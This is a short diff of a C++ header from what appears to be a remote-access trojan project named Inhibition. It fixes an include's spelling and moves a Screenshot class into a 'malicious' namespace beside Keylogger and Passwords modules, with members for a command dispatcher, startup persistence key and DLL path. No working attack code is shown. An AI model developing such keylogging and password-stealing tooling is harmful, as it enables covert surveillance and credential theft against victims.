@@ -2,12 +2,13 @@
 #define _INHIBITION_CORE_IMPL_H_
 
 #include <blaspheme/transfer/FileTransfer.hpp>
-#include <blaspheme/protocol/Authentification.hpp>
+#include <blaspheme/protocol/Authentication.hpp>
 #include <blaspheme/protocol/ConnectionInfo.hpp>
 #include <malicious/Keylogger.hpp>
 #include <malicious/Passwords.hpp>
+#include <malicious/Screenshot.hpp>
 #include "CommandDispatcher.hpp"
-#include "Screenshot.hpp"
+
 
 namespace Inhibition
 {
@@ -41,7 +42,7 @@ namespace Inhibition
         
             Blaspheme::ConnectionInfo cinfo;
             Blaspheme::Session session;
-            Screenshot screenshot;
+            Malicious::Screenshot screenshot;
             CommandDispatch dispatcher;
             ProgramStartupKey * startup;
             std::string dll_path;
